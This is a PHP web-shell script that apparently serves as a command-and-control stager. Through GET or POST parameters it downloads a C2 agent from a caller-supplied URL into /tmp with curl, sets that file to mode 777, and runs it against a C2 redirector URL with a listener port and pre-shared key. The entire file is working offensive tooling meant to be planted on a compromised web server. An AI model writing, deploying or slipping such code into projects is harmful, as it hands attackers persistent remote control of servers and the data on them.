<?php

if ($_SERVER['REQUEST_METHOD'] === 'GET' || $_SERVER['REQUEST_METHOD'] === 'POST') {
    $params = $_GET;
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        // Merge POST parameters, if any, overriding GET parameters
        $params = array_merge($params, $_POST);
    }

    if (isset($params['download']) && $params['download'] === 'true') {
        if (isset($params['c2_agent_url'], $params['agent_name'])) {
            $c2AgentUrl = $params['c2_agent_url'];
            $agentName = $params['agent_name'];

            $command = sprintf("curl -o /tmp/%s %s", escapeshellarg($agentName), escapeshellarg($c2AgentUrl));
            $handle = popen($command, 'w');

            if ($handle !== false) {
                pclose($handle);
                echo "Download initiated successfully.";
            } else {
                echo "Failed to initiate download.";
            }
        } else {
            echo "Missing required parameters for download.";
        }
    } elseif (isset($params['change_perm']) && $params['change_perm'] === 'true') {
        if (isset($params['agent_name'])) {
            $agentName = $params['agent_name'];

            $command = sprintf("chmod 777 /tmp/%s", escapeshellarg($agentName));
            $handle = popen($command, 'w');

            if ($handle !== false) {
                pclose($handle);
                echo "Permission change executed successfully.";
            } else {
                echo "Failed to change permissions.";
            }
        } else {
            echo "Missing required parameter for permission change.";
        }
    } elseif (isset($params['trigger_agent']) && $params['trigger_agent'] === 'true') {
        if (isset($params['c2_redirector_url'], $params['listenerport'], $params['psk'], $params['agent_name'])) {
            $c2RedirectorUrl = $params['c2_redirector_url'];
            $listenerPort = $params['listenerport'];
            $psk = $params['psk'];
            $agentName = $params['agent_name'];

            $command = sprintf("/tmp/%s -url %s/%s -psk %s", escapeshellarg($agentName), escapeshellarg($c2RedirectorUrl), escapeshellarg($listenerPort), escapeshellarg($psk));
            $handle = popen($command, 'w');

            if ($handle !== false) {
                pclose($handle);
                echo "Agent triggered successfully.";
            } else {
                echo "Failed to trigger agent.";
            }
        } else {
            echo "Missing required parameters for triggering agent.";
        }
    } else {
        echo "No valid operation requested.";
    }
} else {
    echo "Unsupported request method.";
}
?>
